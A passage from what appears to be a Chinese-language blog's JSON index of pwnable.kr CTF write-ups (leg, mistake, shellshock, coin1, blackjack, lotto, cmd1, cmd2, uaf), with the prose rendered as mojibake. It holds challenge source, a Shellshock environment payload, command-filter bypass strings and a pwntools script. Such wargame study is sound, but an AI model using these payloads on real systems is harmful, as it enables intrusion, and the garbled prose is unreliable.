æŒ‡å‘å½“å‰æ‰§è¡ŒæŒ‡ä»¤åœ°å€ + 8 å¤„ r0 ä¿å­˜è¿”å›å€¼ r11 å¯¹åº” ebpï¼Œr13 å¯¹åº” esp r15 å³ pcï¼Œå­˜å‚¨å½“å‰æŒ‡ä»¤ + 8ï¼ˆthumb æ¨¡å¼ä¸‹ + 4ï¼‰çš„ä½ç½®ï¼ˆå³åä¸¤æ¡æŒ‡ä»¤ï¼‰ arm æ¨¡å¼ä¸‹æŒ‡ä»¤é•¿åº¦ 4 å­—èŠ‚ï¼Œthumb æ¨¡å¼ä¸‹ 2 å­—èŠ‚ bxï¼šå¸¦çŠ¶æ€åˆ‡æ¢çš„è·³è½¬ çŸ¥é“äº†è¿™äº›åï¼Œé€å‡½æ•°æŸ¥çœ‹ï¼Œå…ˆæ˜¯ key1ï¼š (gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 \u003c+0\u003e: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 \u003c+4\u003e: add r11, sp, #0 0x00008cdc \u003c+8\u003e: mov r3, pc 0x00008ce0 \u003c+12\u003e: mov r0, r3 0x00008ce4 \u003c+16\u003e: sub sp, r11, #0 0x00008ce8 \u003c+20\u003e: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec \u003c+24\u003e: bx lr End of assembler dump. å‰ä¸¤å¥å’Œåä¸‰å¥æ˜¯ arm çš„å‡½æ•°å…¥æ ˆå‡ºæ ˆè¿”å›æ“ä½œï¼Œä¸­é—´ç»™ r3 èµ‹å€¼ 0x00008ce4 å¹¶è¿”å›ã€‚ key2ï¼š (gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 \u003c+0\u003e: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 \u003c+4\u003e: add r11, sp, #0 0x00008cf8 \u003c+8\u003e: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc \u003c+12\u003e: add r6, pc, #1 0x00008d00 \u003c+16\u003e: bx r6 0x00008d04 \u003c+20\u003e: mov r3, pc 0x00008d06 \u003c+22\u003e: adds r3, #4 0x00008d08 \u003c+24\u003e: push {r3} 0x00008d0a \u003c+26\u003e: pop {pc} 0x00008d0c \u003c+28\u003e: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 \u003c+32\u003e: mov r0, r3 0x00008d14 \u003c+36\u003e: sub sp, r11, #0 0x00008d18 \u003c+40\u003e: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c \u003c+44\u003e: bx lr End of assembler dump. ç¬¬ä¸‰è¡Œä¿å­˜ r6ï¼Œç¬¬å››è¡Œ r6 å˜æˆ 0x00008d05ï¼Œç¬¬äº”è¡Œè¿›è¡Œå¸¦çŠ¶æ€åˆ‡æ¢çš„è·³è½¬ï¼Œç”±äº r6 æœ€ä½ä½ä¸º 1ï¼Œåˆ‡æ¢ä¸º thumb æ¨¡å¼å¹¶è·³è½¬åˆ° 0x00008d04ï¼Œä¹Ÿå°±æ˜¯ç¬¬å…­è¡Œã€‚ ç¬¬å…­è¡Œï¼Œç”±äºå¤„äº thumb æ¨¡å¼ï¼Œpc æŒ‡å‘å½“å‰æŒ‡ä»¤ + 4 çš„ä½ç½®ï¼Œr3 å˜æˆ 0x00008d08ã€‚ç¬¬ä¸ƒè¡Œ r3+4 å˜æˆ 0x0008d0cï¼Œè¿™å°±æ˜¯æœ€ç»ˆçš„è¿”å›å€¼ã€‚ key3ï¼š (gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 \u003c+0\u003e: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 \u003c+4\u003e: add r11, sp, #0 0x00008d28 \u003c+8\u003e: mov r3, lr 0x00008d2c \u003c+12\u003e: mov r0, r3 0x00008d30 \u003c+16\u003e: sub sp, r11, #0 0x00008d34 \u003c+20\u003e: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 \u003c+24\u003e: bx lr End of assembler dump. (gdb) è¿™é‡Œå°† lr èµ‹å€¼ç»™ r3ï¼Œç„¶å r3 ä½œä¸ºè¿”å›å€¼ã€‚è€Œ lr ç›¸å½“äº return addressï¼Œéœ€è¦æˆ‘ä»¬å›åˆ° main é‡Œå»çœ‹ç›¸å…³è°ƒç”¨ï¼š ... 0x00008d64 \u003c+40\u003e: bl 0xfbd8 \u003c__isoc99_scanf\u003e 0x00008d68 \u003c+44\u003e: bl 0x8cd4 \u003ckey1\u003e 0x00008d6c \u003c+48\u003e: mov r4, r0 0x00008d70 \u003c+52\u003e: bl 0x8cf0 \u003ckey2\u003e 0x00008d74 \u003c+56\u003e: mov r3, r0 0x00008d78 \u003c+60\u003e: add r4, r4, r3 0x00008d7c \u003c+64\u003e: bl 0x8d20 \u003ckey3\u003e 0x00008d80 \u003c+68\u003e: mov r3, r0 0x00008d84 \u003c+72\u003e: add r2, r4, r3 ... å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿›è¡Œäº† bl 0x8d20 æ¥è°ƒç”¨ key3 å‡½æ•°ï¼ŒæŒ‡ä»¤ä½äº 0x00008d7cï¼Œé‚£ä¹ˆæ­¤æ—¶è¿”å›åœ°å€åº”è¯¥æ˜¯å®ƒçš„ä¸‹ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨åœ°å€ï¼Œä¹Ÿå°±æ˜¯ 0x00008d80ã€‚ è‡³æ­¤æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº† 3 ä¸ª keyï¼Œç›¸åŠ å¾—åˆ° 108400ï¼Œè¾“å…¥å³å¯ã€‚ ç²¾ç®€æŒ‡ä»¤é›†çš„ç¡®ç²¾ç®€ã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:8:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"mistake #include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i\u003clen; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c0){ printf(\"can't open password %d\\n\", fd); return 0; } printf(\"do not bruteforce...\\n\"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) \u003e 0)){ printf(\"read error\\n\"); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\"input password :\"); scanf(\"%10s\", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\"Password OK\\n\"); system(\"/bin/cat flag\\n\"); } else{ printf(\"Wrong Password\\n\"); } close(fd); return 0; } æ³¨æ„åˆ° XORKEY ä¸º 1ï¼Œä¹Ÿå°±æ˜¯è¯´ xor å‡½æ•°åªæ˜¯æŠŠå­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦æœ€ä½ä½ç¿»è½¬äº†ä¸€ä¸‹ã€‚æ­¤å¤–æˆ‘ä»¬è¿˜çŸ¥é“è¾“å…¥çš„å¯†ç å’Œæ–‡ä»¶ä¸­å¯†ç éƒ½æ˜¯ 10 å­—èŠ‚ï¼Œä½†æˆ‘ä»¬è¯»å–ä¸äº†åè€…ã€‚ å›åˆ°é¢˜ç›®æç¤ºï¼Œè¯´å’Œè¿ç®—ç¬¦ä¼˜å…ˆçº§æœ‰å…³ï¼Œå›ä»£ç é‡Œçœ‹çœ‹ä¹Ÿåªæœ‰ fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0 å¯èƒ½å‡ºé—®é¢˜äº†ï¼Œè¿™é‡Œä¼šå…ˆè¿›è¡Œå°äºå·æ¯”è¾ƒï¼Œå†å°†ç»“æœï¼Œä¸€ä¸ªå¸ƒå°”å€¼ï¼Œèµ‹å€¼ç»™ fdã€‚å¦‚æœæ–‡ä»¶æ­£å¸¸æ‰“å¼€ï¼Œé‚£ä¹ˆ fd åº”è¯¥ä¸º false ä¹Ÿå°±æ˜¯ 0ï¼Œè¿™å°±æ˜¯æ ‡å‡†è¾“å…¥æµçš„ fdï¼Œæ¢å¥è¯è¯´è¿™ä¸ª pw_buf çš„å†…å®¹ä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚ ä¹‹åå°±å®¹æ˜“äº†ï¼Œæ ‡å‡†è¾“å…¥é‡Œè¾“å…¥åä¸ª bï¼Œç„¶åæç¤º input password: æ—¶è¾“å…¥åä¸ª c ä½¿å¾—å¼‚æˆ–ç»“æœæ­£ç¡®å³å¯ã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:9:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"shellshock #include \u003cstdio.h\u003eint main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\"/home/shellshock/bash -c'echo shock_me'\"); return 0; } æˆ‘ä»¬éœ€è¦ç»“åˆ ls -al çš„ç»“æœæ¥åˆ†æä»£ç ï¼š drwxr-x--- 5 root shellshock 4096 Oct 23 2016 . drwxr-xr-x 114 root root 4096 May 19 15:59 .. -r-xr-xr-x 1 root shellshock 959120 Oct 12 2014 bash d--------- 2 root root 4096 Oct 12 2014 .bash_history -r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flag dr-xr-xr-x 2 root root 4096 Oct 12 2014 .irssi drwxr-xr-x 2 root root 4096 Oct 23 2016 .pwntools-cache -r-xr-sr-x 1 root shellshock_pwn 8547 Oct 12 2014 shellshock -r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯¹ flag æ–‡ä»¶æ²¡æœ‰ä»»ä½•æƒé™ï¼Œä½†æ˜¯ shellshock_pwn ç»„çš„ç”¨æˆ·å¯ä»¥è¯» flagã€‚å›åˆ°ä»£ç ä¸­ï¼Œå°† uid å’Œ gid è®¾æˆ egid åï¼Œç¨‹åºå·²ç»æ‹¥æœ‰äº† shellshock_pwn ç»„çš„æƒé™ï¼Œå¯ä»¥è¯»åˆ° flag äº†ï¼Œåªæ˜¯å¹¶æ²¡æœ‰è¯» flag çš„ä»£ç ã€‚ è”ç³»é¢˜ç›®æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ bash çš„ ShellShock æ¼æ´ï¼Œå…·ä½“åŸç†å¯ä»¥å‚è€ƒé“¾æ¥ä¸­çš„æ–‡ç« ã€‚è¾“å…¥ payloadï¼š $ export foo='() {:;}; /bin/cat flag' $ ./shellshock ","date":"2019-10-09","objectID":"/pwnkr-toddler/:10:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"coin1 æ‰¾å‡å¸é—®é¢˜ï¼Œåœ¨ N ä¸ªç¡¬å¸ä¸­æœ€å¤šèŠ± C æ¬¡æ¥æ‰¾åˆ°å”¯ä¸€çš„ä¸€ä¸ªè¾ƒè½»çš„å‡å¸ï¼Œéœ€è¦åœ¨ 30 ç§’å†…å®Œæˆ 100 æ¬¡æ¸¸æˆã€‚æœ€ç»å…¸çš„è§£æ³•å°±æ˜¯äºŒåˆ†ï¼Œæ¯æ¬¡ç§°ä¸€åŠï¼Œå¦‚æœé‡é‡ä¸æ˜¯ 10 çš„å€æ•°åˆ™å…¶ä¸­å¿…å®šæœ‰å‡å¸ï¼Œå¦åˆ™å‡å¸åœ¨å¦ä¸€åŠä¸­ï¼Œè¿™æ ·æœ€å¤šéœ€è¦ log(2, n) æ¬¡å°±èƒ½æ‰¾å‡ºå‡å¸ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºç½‘ç»œå»¶è¿Ÿçš„å…³ç³»ï¼Œæœ€å¥½æ˜¯åœ¨ pwnable.kr çš„æœºå™¨ä¸Šè¿è¡Œè„šæœ¬ã€‚ from pwn import * import re p = remote('localhost', 9007) ret = p.recv() sleep(3) for i in range(100): ret = p.recv() N = ret[ret.find(\"N=\")+2:ret.find(\" \")] C = ret[ret.find(\"C=\")+2:ret.find(\"\\n\")] low = 0 high = int(N) for j in range(int(C)): cnt = (high-low) / 2 mid = low + cnt query = ''.join([str(i) for i in range(low, mid)]) p.sendline(query) ret = p.recv() if int(ret) % 10 == 0: low = mid else: high = mid p.sendline(str(low)) print p.recv() print p.recv() ","date":"2019-10-09","objectID":"/pwnkr-toddler/:11:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"blackjack è¿™é¢˜è¦æ±‚ç© 21 ç‚¹ç©åˆ°æ‹¥æœ‰ $1,000,000ï¼Œæ˜¾ç„¶ä¸èƒ½é€šè¿‡å¸¸è§„æ–¹æ³•è¾¾æˆã€‚æˆ‘ä»¬æŸ¥çœ‹é¢˜ç›®ç»™çš„æºç ï¼Œå‘ç°ä¸‹æ³¨æ—¶ä½¿ç”¨çš„å˜é‡ bet æ˜¯ä¸€ä¸ª int ç±»å‹çš„æ•°ã€‚ éšåï¼Œbetting å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š int betting() //Asks user amount to bet { printf(\"\\n\\nEnter Bet: $\"); scanf(\"%d\", \u0026bet); if (bet\u003e cash) //If player tries to bet more money than player has { printf(\"\\nYou cannot bet more money than you have.\"); printf(\"\\nEnter Bet:\"); scanf(\"%d\", \u0026bet); return bet; } else return bet; } // End Function è¿™é‡Œç¨‹åºæ£€æŸ¥äº†ä¸‹çš„æ³¨æ˜¯å¦å¤§äºæ‹¥æœ‰çš„ç°é‡‘æ•°ï¼Œä½†å¹¶æ²¡æœ‰æ£€æŸ¥æ˜¯å¦ä¸ºè´Ÿæ•°ã€‚è€Œå½“æˆ‘ä»¬è¾“æ‰ä¸€ç›˜åï¼š if(player_total\u003cdealer_total) //If player's total is less than dealer's total, loss { printf(\"\\nDealer Has the Better Hand. You Lose.\\n\"); loss = loss+1; cash = cash - bet; printf(\"\\nYou have %d Wins and %d Losses. Awesome!\\n\", won, loss); dealer_total=0; askover(); } å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ª cash = cash - bet çš„è¯­å¥ï¼Œå½“æˆ‘ä»¬è¾“å…¥çš„ bet æ˜¯è´Ÿæ•°æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®©é’±ä¸å‡åå¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸‹æ³¨ -1000000ï¼Œç„¶åæ•…æ„è¾“æ‰å³å¯ã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:12:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lotto #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cfcntl.h\u003e unsigned char submit[6]; void play(){ int i; printf(\"Submit your 6 lotto bytes :\"); fflush(stdout); int r; r = read(0, submit, 6); printf(\"Lotto Start!\\n\"); //sleep(1); // generate lotto numbers int fd = open(\"/dev/urandom\", O_RDONLY); if(fd==-1){ printf(\"error. tell admin\\n\"); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(\"error2. tell admin\\n\"); exit(-1); } for(i=0; i\u003c6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(\"/bin/cat flag\"); } else{ printf(\"bad luck...\\n\"); } } void help(){ printf(\"- nLotto Rule -\\n\"); printf(\"nlotto is consisted with 6 random natural numbers less than 46\\n\"); printf(\"your goal is to match lotto numbers as many as you can\\n\"); printf(\"if you win lottery for *1st place*, you will get reward\\n\"); printf(\"for more details, follow the link below\\n\"); printf(\"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\"); printf(\"mathematical chance to win this game is known to be 1/8145060.\\n\"); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(\"- Select Menu -\\n\"); printf(\"1. Play Lotto\\n\"); printf(\"2. Help\\n\"); printf(\"3. Exit\\n\"); scanf(\"%d\", \u0026menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(\"bye\\n\"); return 0; default: printf(\"invalid menu\\n\"); break; } } return 0; } å¾ˆç®€å•çš„å½©ç¥¨ç¨‹åºï¼Œåˆ©ç”¨ä¼ªéšæœºæ•°ç”Ÿæˆ 6 ä¸ª 1 - 45 ä¹‹é—´çš„å½©ç¥¨å·ç ï¼Œç„¶åè·Ÿè¾“å…¥æ¯”å¯¹ï¼Œå¦‚æœå…¨ä¸­åˆ™æ˜¾ç¤º flagã€‚è¿™ä¸ªç¨‹åºå¦‚æ­¤ç®€å•ä»¥è‡³äºå…¶ä¸­çš„ä¸€ä¸ªç»†èŠ‚å¾ˆå®¹æ˜“è¢«å¿½ç•¥ï¼š // calculate lotto score int match = 0, j = 0; for(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } è¿™æ˜¯æ¯”å¯¹å½©ç¥¨å·ç çš„ä»£ç ï¼Œåˆçœ‹ä¹‹ä¸‹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœè®©æˆ‘ä»¬è‡ªå·±æ¥å†™ï¼Œæ­£å¸¸çš„å†™æ³•è‚¯å®šæ˜¯ï¼š for (i = 0; i \u003c 6; i++) { if (lotto[i] == submit[i]) { match++; } } ä½†è¿™é‡Œå´ç”¨äº†ä¸¤å±‚å¾ªç¯ï¼Œå¹¶ä¸æ˜¯åƒæˆ‘ä»¬æƒ³çš„é‚£æ ·æ¯”è¾ƒå¯¹åº”ä½ï¼Œè€Œæ˜¯ä» lotto å’Œ submit ä¸­å„è‡ªä»»å–ä¸€ä½ï¼Œè¿›è¡Œå…± 36 æ¬¡æ¯”è¾ƒã€‚è€Œå¯¹ match çš„è¦æ±‚æ˜¯ 6ï¼Œä¹Ÿå°±æ˜¯è¯´ 36 æ¬¡æ¯”è¾ƒä¸­æœ‰ 6 æ¬¡æ­£ç¡®å³å¯ã€‚ ä¸ºäº†è®©æˆåŠŸçš„æœºç‡æœ€å¤§ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ 6 ä¸ªç›¸åŒçš„æ•°å­— xï¼Œåªè¦åœ¨ lotto ä¸­æœ‰ä¸€ä¸ªå·ç ç­‰äº xï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æˆåŠŸäº†ï¼Œè¿™ä¸ªæ¦‚ç‡è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯è¾“å…¥çš„å­—èŠ‚èŒƒå›´æ˜¯ä» \\x01 åˆ° \\x45ï¼ˆ-ï¼‰ï¼Œè€Œä¸æ˜¯æ•°å­— 1-45ã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:13:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"cmd1 #include \u003cstdio.h\u003e#include \u003cstring.h\u003e int filter(char* cmd){ int r=0; r += strstr(cmd,\"flag\")!=0; r += strstr(cmd,\"sh\")!=0; r += strstr(cmd,\"tmp\")!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system(argv[1] ); return 0; } éœ€è¦ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œä½†å‚æ•°ä¸­ä¸èƒ½åŒ…å« flagï¼Œsh å’Œ tmpï¼Œè¿™ä¸ªæˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€šé…ç¬¦ç»•è¿‡ã€‚æ³¨æ„åˆ°ç¯å¢ƒå˜é‡ PATH è¢«è¦†ç›–ï¼Œå› æ­¤æˆ‘ä»¬è°ƒç”¨å‘½ä»¤æ—¶éœ€è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚ $ ./cmd1 \"/bin/cat /home/cmd1/fla*\" ","date":"2019-10-09","objectID":"/pwnkr-toddler/:14:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"cmd2 #include \u003cstdio.h\u003e#include \u003cstring.h\u003e int filter(char* cmd){ int r=0; r += strstr(cmd,\"=\")!=0; r += strstr(cmd,\"PATH\")!=0; r += strstr(cmd,\"export\")!=0; r += strstr(cmd,\"/\")!=0; r += strstr(cmd,\"`\")!=0; r += strstr(cmd,\"flag\")!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(\"PATH=/no_command_execution_until_you_become_a_hacker\"); if(filter(argv[1])) return 0; printf(\"%s\\n\", argv[1]); system(argv[1] ); return 0; } è¿™æ¬¡åˆ é™¤äº†æ‰€æœ‰ç¯å¢ƒå˜é‡å¹¶è¦†ç›–äº† PATHï¼ŒåŒæ—¶å¢å¼ºäº†å¯¹å‘½ä»¤è¡Œå‚æ•°çš„è¿‡æ»¤ï¼Œå…³é”®åœ¨äº / è¢«è¿‡æ»¤äº†ï¼Œä¸èƒ½ç›´æ¥å†™è·¯å¾„ã€‚ é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ¥æ„é€ å‡º /ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ° pwd å‘½ä»¤ã€‚æˆ‘ä»¬å…ˆ cd /ï¼Œæ­¤æ—¶è¿è¡Œ pwd å¯ä»¥çœ‹åˆ°è¾“å‡ºå°±æ˜¯ /ã€‚ ä»¿ç…§ cmd1ï¼š $ /home/cmd2/cmd2 \"$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*\" ä½†æ˜¯è¿™æ ·æ²¡æœ‰ç”¨ï¼ŒçŒœæƒ³æ˜¯å› ä¸º $(pwd) å…ˆè¢«æ›¿æ¢æˆ / äº†ï¼Œå› ä¸ºåŒå¼•å·ä¸ä¼šå¿½ç•¥ $ã€‚æˆ‘ä»¬ç”¨å•å¼•å·å°±å¯ä»¥é˜²æ­¢è¿™ä¸€æ›¿æ¢ã€‚ $ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*' ","date":"2019-10-09","objectID":"/pwnkr-toddler/:15:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"uaf #include \u003cfcntl.h\u003e#include \u003ciostream\u003e#include \u003ccstring\u003e#include \u003ccstdlib\u003e#include \u003cunistd.h\u003eusing namespace std; class Human{ private: virtual void give_shell(){ system(\"/bin/sh\"); } protected: int age; string name; public: virtual void introduce(){ cout \u003c\u003c\"My name is \" \u003c\u003c name \u003c\u003c endl; cout \u003c\u003c\"I am \"\u003c\u003c age \u003c\u003c\" years old\" \u003c\u003c endl; } }; class Man: public Human{ public: Man(string name, int age){ this-\u003ename = name; this-\u003eage = age; } virtual void introduce(){ Human::introduce(); cout \u003c\u003c\"I am a nice guy!\" \u003c\u003c endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-\u003ename = name; this-\u003eage = age; } virtual void introduce(){ Human::introduce(); cout \u003c\u003c\"I am a cute girl!\" \u003c\u003c endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(\"Jack\", 25); Human* w = new Woman(\"Jill\", 21); size_t len; char* data; unsigned int op; while(1){ cout \u003c\u003c\"1. use\\n2. after\\n3. free\\n\"; cin \u003e\u003e op; switch(op){ case 1: m-\u003eintroduce(); w-\u003eintroduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout \u003c\u003c\"your data is allocated\" \u003c\u003c endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } æœ¬é¢˜æœ€ç»ˆè‚¯å®šæ˜¯è¦è°ƒç”¨ Human çš„ give_shell å‡½æ•°ï¼Œä½†ç¨‹åºä¸ä¼šç›´æ¥è°ƒç”¨ã€‚ç¨‹åºå…±æœ‰ä¸‰ç§æ“ä½œï¼š use: è°ƒç”¨ Man å’Œ Woman å¯¹è±¡çš„ introduce å‡½æ•° after: ä» argv[2] ä¸­è¯»å–é•¿ä¸º argv[1] çš„æ•°æ®ï¼Œæ”¾åˆ° data ä¸­ free: é‡Šæ”¾ Man å’Œ Woman å¯¹è±¡çš„æŒ‡é’ˆ æˆ‘ä»¬è¿™é‡Œå¯ä»¥çŒœæƒ³æ˜¯è¦å°† introduce å‡½æ•°åŠ«æŒåˆ° give_shell ä¸Šï¼Œä½†æ˜¯å…·ä½“æ€ä¹ˆåšï¼Ÿæ³¨æ„åˆ° give_shell å’Œ introduce éƒ½æ˜¯è¢«ç»§æ‰¿çš„è™šå‡½æ•°ï¼Œèƒ½ä¸èƒ½é€šè¿‡æ”¹å˜å‡½æ•°è™šè¡¨åœ°å€æ¥åŠ«æŒå‡½æ•°å‘¢ï¼Ÿ é¦–å…ˆæˆ‘ä»¬å°è¯•æ‰¾åˆ° Man çš„è™šå‡½æ•°è¡¨ã€‚åœ¨ main ä¸­æ‰¾åˆ° Man æ„é€ å‡½æ•°çš„åœ°å€ï¼š å›¾ 1 \" å›¾ 1 æ³¨æ„åˆ°å¯¹è±¡è¢«æ”¾åˆ° rbx é‡Œï¼Œæˆ‘ä»¬åœ¨æ„é€ å‡½æ•°æ‰§è¡Œåä¸‹æ–­ç‚¹ï¼Œå¯ä»¥æŸ¥çœ‹ Man çš„å¯¹è±¡ï¼š (gdb) b *0x400f18 (gdb) c (gdb) p/x $rbx $1 = 0x1fe8c50 (gdb) x/8 0x1fe8c50 0x1fe8c50: 0x00401570 0x00000000 0x00000019 0x00000000 0x1fe8c60: 0x01fe8c38 0x00000000 0x000203a1 0x00000000 ç”±äºè™šå‡½æ•°è¡¨åœ°å€åœ¨å¯¹è±¡é¦–éƒ¨ï¼Œæ‰€ä»¥è¿™é‡Œè™šå‡½æ•°è¡¨åœ°å€å°±æ˜¯ 0x401570ã€‚æˆ‘ä»¬ç»§ç»­çœ‹è™šå‡½æ•°è¡¨ï¼š (gdb) x/8a 0x401570 0x401570 \u003c_ZTV3Man+16\u003e: 0x40117a \u003c_ZN5Human10give_shellEv\u003e 0x4012d2 \u003c_ZN3Man9introduceEv\u003e 0x401580 \u003c_ZTV5Human\u003e: 0x0 0x4015f0 \u003c_ZTI5Human\u003e 0x401590 \u003c_ZTV5Human+16\u003e: 0x40117a \u003c_ZN5Human10give_shellEv\u003e 0x401192 \u003c_ZN5Human9introduceEv\u003e 0x4015a0 \u003c_ZTS5Woman\u003e: 0x6e616d6f5735 0x0 ç”¨ a å¯ä»¥æŠŠå‡½æ•°åæ˜¾ç¤ºå‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ° Man å’Œ Human çš„ give_shell è™šå‡½æ•°åœ°å€ç›¸åŒï¼Œè€Œ introduce ä¸åŒï¼Œè¿™æ˜¯ç¬¦åˆ C++ è™šå‡½æ•°æœºåˆ¶çš„ï¼šç§æœ‰è™šå‡½æ•°ä¸èƒ½è¢«ç»§æ‰¿ï¼Œä½†æ˜¯ä¼šåœ¨å­ç±»çš„è™šå‡½æ•°è¡¨ä¸­å‡ºç°ã€‚æ¢å¥è¯è¯´ï¼Œå­ç±»è°ƒç”¨çš„æœ¬è´¨ä¸Šè¿˜æ˜¯çˆ¶ç±»çš„è™šå‡½æ•°ã€‚ æ¥ä¸‹æ¥ç”¨ IDA åˆ†æï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥ 1 çš„æ—¶å€™æ‰§è¡Œï¼š å›¾ 2 \" å›¾ 2 ä¹Ÿå°±æ˜¯ä¸¤ä¸ª introduceï¼Œé‚£ä¹ˆè¿™é‡Œçš„ v12 å’Œ v13 å°±å¯ä»¥ç¡®å®šæ˜¯å¯¹åº”äº m å’Œ w 